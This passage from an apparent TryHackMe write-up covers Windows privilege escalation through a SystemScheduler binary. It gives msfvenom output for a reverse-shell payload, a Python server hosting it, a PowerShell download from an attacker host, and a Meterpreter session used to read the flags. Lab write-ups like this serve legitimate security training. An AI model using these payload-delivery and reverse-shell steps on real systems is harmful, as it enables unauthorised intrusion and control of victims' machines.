</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Windows%20from%20the%20payload%0AFound%201%20compatible%20encoders%0AAttempting%20to%20encode%20payload%20with%201%20iterations%20of%20x86/shikata_ga_nai%0Ax86/shikata_ga_nai%20succeeded%20with%20size%20368%20(iteration=0)%0Ax86/shikata_ga_nai%20chosen%20with%20final%20size%20368%0APayload%20size:%20368%20bytes%0AFinal%20size%20of%20exe%20file:%2073802%20bytes%0ASaved%20as:%20Message.exe" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: Message.exe
</code></pre><p>Create a <code>python web server</code> to download the <code>reverse shell</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python%20-m%20http.server%208080" type="button"></button></div></div><pre><code>python -m http.server 8080
</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Serving%20HTTP%20on%200.0.0.0%20port%208080%20(http://0.0.0.0:8080/)%20..." type="button"></button></div></div><pre><code>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</code></pre><p>From the <code>meterpreter</code> shell in <code>msfconsole -q</code>, download the payload and exit the shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%3E%20shell%0AC:%5CProgram%20Files%20(x86)%5CSystemScheduler%3E%20powershell%20-c%20wget%20%22http://%3Csource-ip%3E:8080/Message.exe%22%20-outfile%20shell.exe%0Apowershell%20-c%20wget%20%22http://%3Csource-ip%3E:8080/Message.exe%22%20-outfile%20shell.exe%0A%0AC:%5CProgram%20Files%20(x86)%5CSystemScheduler%3E%5EC%0ATerminate%20channel%204?%20[y/N]%20%20y%0Ameterpreter%20%3E%20exit%0A[*]%20Shutting%20down%20Meterpreter...%0A%0A[*]%20%3Ctarget-ip%3E%20-%20Meterpreter%20session%201%20closed.%20%20Reason:%20User%20exit" type="button"></button></div></div><pre><code>meterpreter&gt; shell
C:\Program Files (x86)\SystemScheduler&gt; powershell -c wget "http://&lt;source-ip&gt;:8080/Message.exe" -outfile shell.exe
powershell -c wget "http://&lt;source-ip&gt;:8080/Message.exe" -outfile shell.exe

C:\Program Files (x86)\SystemScheduler&gt;^C
Terminate channel 4? [y/N]  y
meterpreter &gt; exit
[*] Shutting down Meterpreter...

[*] &lt;target-ip&gt; - Meterpreter session 1 closed.  Reason: User exit
</code></pre><p>From the <code>meterpreter</code> shell in <code>msfconsole -q</code>, set <code>LPORT</code> variable as per new <code>reverse shell</code> payload, retaining existing handler and other variables, and exploit to get the flags.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(multi/handler)%20%3E%20set%20LPORT%204444%0ALPORT%20=%3E%204444%0A%0Amsf5%20exploit(multi/handler)%20%3E%20run%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Csource-ip%3E:4444%0A[*]%20Sending%20stage%20(176195%20bytes)%20to%20%3Ctarget-ip%3E%0A[*]%20Meterpreter%20session%202%20opened%20(%3Csource-ip%3E:4444%20-%3E%20%3Ctarget-ip%3E:49332)%20at%202021-05-02%2006:24:01%20+0100%0A%0Ameterpreter%20%3E%20shell%0AProcess%20812%20created.%0AChannel%202%20created.%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5CPROGRA~2%5CSYSTEM~1%3Ecd%20C:%5CUsers%5Cjeff%5CDesktop%0Acd%20C:%5CUsers%5Cjeff%5CDesktop%0A%0Ac:%5CUsers%5Cjeff%5CDesktop%3Etype%20user.txt%0Atype%20user.txt%0A%3Cflag%3E%0A%0Ac:%5CUsers%5Cjeff%5CDesktop%3Ecd%20../../Administrator/Desktop%0Acd%20C:%5CUsers%5Cjeff%5CDesktop%0A%0Ac:%5CUsers%5CAdministrator%5CDesktop%3Etype%20root.txt%0Atype%20root.txt%0A%3Cflag%3E" type="button"></button></div></div><pre><code>msf5 exploit(multi/handler) &gt; set LPORT 4444
LPORT =&gt; 4444

msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on &lt;source-ip&gt;:4444
[*] Sending stage (176195 bytes) to &lt;target-ip&gt;
[*] Meterpreter session 2 opened (&lt;source-ip&gt;:4444 -&gt; &lt;target-ip&gt;:49332) at 2021-05-02 06:24:01 +0100

meterpreter &gt; shell
Process 812 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1&gt;cd C:\Users\jeff\Desktop
cd C:\Users\jeff\Desktop

c:\Users\jeff\Desktop&gt;type user.txt
type user.txt
&lt;flag&gt;

c:\Users\jeff\Desktop&gt;cd ../../Administrator/Desktop
cd C:\Users\jeff\Desktop

c:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
&lt;flag&gt;
</code></pre><h2 id="task-5---privilege-escalation-without-metasploit">Task 5 - Privilege Escalation Without Metasploit</h2><p>The same tasks for gaining <code>reverse shell</code> and <code>privilege shell</code> can be done without <code>meterpreter</code>.</p><p>When the initial <code>netcat</code> listener connection was established, <code>python web shell</code> can be created and <code>winPEAS</code> scripts can be dowloaded to <code>C:\Windows\Temp</code>, which is world writable. Exploits can be found using <code>winPEASx64.exe</code> or <code>winPEAS.bat</code> and <code>reverse shell</code> payloads can be generated as earlier. Once the <code>Message.exe</code> is replaced with <code>reverse shell</code> payload for <code>privilege escalation</code>, flags can be obtained.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-blue/"><div class="card-body"> <span class="timeago small" > Mar 23 <i class="unloaded">2021-03-23T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Blue</h3><div class="text-muted small"><p> Blue This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeratio...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-steel-mountain/"><div class="card-body"> <span class="timeago small" > Mar 24 <i class="unloaded">2021-03-24T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Steel Mountain</h3><div class="text-muted small"><p> Steel Mountain This room contains detailed info about rejetto http vulnerability exploitation and privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-steel-mountain/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Steel Mountain</p></a> <a href="/posts/tryhackme-what-the-shell/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - What the Shell?</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
